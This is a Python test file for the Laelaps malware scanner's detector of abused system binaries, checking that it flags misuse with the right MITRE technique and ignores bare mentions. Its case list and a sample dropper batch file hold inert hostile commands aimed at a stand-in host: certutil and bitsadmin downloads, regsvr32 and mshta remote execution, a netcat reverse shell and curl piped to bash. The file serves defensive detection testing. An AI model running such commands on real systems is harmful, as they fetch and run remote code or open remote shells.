#!/usr/bin/env python3
"""
Laelaps LOLBAS / GTFOBins (living-off-the-land) tests.

Malware increasingly avoids dropping its own tools and instead abuses legitimate
signed OS binaries - certutil to download, regsvr32 to execute, msbuild to bypass
allow-listing, nc/bash for a reverse shell. These assert Laelaps flags that abuse
(with the right technique) while NOT firing on bare mentions of the same binaries.

Every sample is an inert command string; nothing is executed. Fully offline.
Run:  python3 tests/lolbas_test.py
"""
import os
import sys
import tempfile

os.environ["LAELAPS_OFFLINE"] = "1"
os.environ.pop("ANTHROPIC_API_KEY", None)
os.environ.pop("OPENAI_API_KEY", None)

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
import laelaps as L  # noqa: E402

checks = []


def check(name, cond, extra=""):
    ok = bool(cond)
    checks.append(ok)
    print(f"  [{'PASS' if ok else 'FAIL'}] {name}{(' -> ' + extra) if extra and not ok else ''}")


print("=== scan_lolbas: abuse patterns fire with the right technique ===")
CASES = [
    ("certutil download", "certutil.exe -urlcache -split -f http://evil.tld/a.exe a.exe", "T1105"),
    ("regsvr32 squiblydoo", "regsvr32 /s /n /u /i:http://evil.tld/x.sct scrobj.dll", "T1218.010"),
    ("msbuild AWL bypass", r"c:\windows\microsoft.net\framework\v4.0\msbuild.exe payload.csproj", "T1127.001"),
    ("mshta remote", "mshta http://evil.tld/a.hta", "T1218.005"),
    ("bitsadmin download", "bitsadmin /transfer j /download http://evil/x.exe c:\\x.exe", "T1197"),
    ("wmic process call", 'wmic process call create "cmd /c evil.exe"', "T1047"),
    ("nc reverse shell", "nc -e /bin/sh 10.0.0.1 4444", "T1059.004"),
    ("curl pipe shell", "curl -s http://evil.tld/i.sh | bash", "T1105"),
]
for name, cmd, want_mitre in CASES:
    sigs = L.scan_lolbas(cmd.lower())
    hit = bool(sigs) and any(want_mitre in s.mitre for s in sigs)
    check(f"{name} flagged ({want_mitre})", hit, str([s.title for s in sigs]))

print("=== false-positive guard: bare mentions do NOT fire ===")
benign = ("certutil is a windows certificate utility. regsvr32 registers dlls. "
          "msbuild compiles projects. netcat (nc) is a networking tool.")
check("bare mentions in prose produce no LOLBAS signal", L.scan_lolbas(benign.lower()) == [])

print("=== via analyze_file_v2: a multi-LOLBin dropper is flagged ===")
tmp = tempfile.mkdtemp(prefix="laelaps_lolbas_")
dropper = os.path.join(tmp, "update.bat")
with open(dropper, "w") as f:
    f.write("@echo off\r\n"
            "certutil.exe -urlcache -split -f http://evil.tld/p.exe %TEMP%\\p.exe\r\n"
            "regsvr32 /s /n /u /i:http://evil.tld/x.sct scrobj.dll\r\n")
rep = L.analyze_file_v2(dropper, use_llm=False)
check("dropper carries a lolbas-engine signal", any(s.engine == "lolbas" for s in rep.signals))
check("dropper verdict is suspicious or malicious", rep.verdict in ("suspicious", "malicious"), rep.verdict)
check("dropper MITRE includes ingress-tool-transfer", "T1105" in rep.mitre, str(rep.mitre))

print("=== via analyze_file_v2: benign script is not LOLBAS-flagged ===")
benign_bat = os.path.join(tmp, "hello.bat")
with open(benign_bat, "w") as f:
    f.write("@echo off\r\necho Hello and welcome. This installer uses msbuild internally.\r\n")
repb = L.analyze_file_v2(benign_bat, use_llm=False)
check("benign script has no lolbas signal", not any(s.engine == "lolbas" for s in repb.signals))

passed, total = sum(checks), len(checks)
print(f"\n=== {passed}/{total} checks passed ===")
sys.exit(0 if passed == total else 1)
